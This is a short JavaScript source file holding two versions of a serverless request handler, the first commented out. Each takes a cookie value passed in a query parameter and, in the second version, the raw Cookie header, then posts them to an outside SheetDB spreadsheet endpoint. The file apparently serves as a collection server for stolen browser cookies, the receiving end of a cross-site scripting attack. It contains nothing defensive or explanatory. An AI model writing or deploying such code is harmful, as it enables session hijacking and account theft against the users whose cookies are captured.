// export default async function handler(req, res) {
//   const cookie = req.query.c || "no-cookie";

//   try {
//     await fetch("https://sheetdb.io/api/v1/52j1sx3wjdti6", {
//       method: "POST",
//       headers: {
//         "Content-Type": "application/json"
//       },
//       body: JSON.stringify({
//         data: [{ indusdata: cookie }]
//       })
//     });

//     res.status(200).send("Cookie sent to SheetDB");
//   } catch (err) {
//     res.status(500).send("Error: " + err.message);
//   }
// }


// this is 2nd code 
export default async function handler(req, res) {
  const cookieFromQuery = req.query.c || "no-cookie";
  const rawCookieFromHeader = req.headers.cookie || "header-cookie-missing";

  try {
    await fetch("https://sheetdb.io/api/v1/52j1sx3wjdti6", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        data: [{
          indusdata: cookieFromQuery,
          fromHeader: rawCookieFromHeader
        }]
      })
    });

    res.status(200).send("Cookies sent to SheetDB");
  } catch (err) {
    res.status(500).send("Error: " + err.message);
  }
}
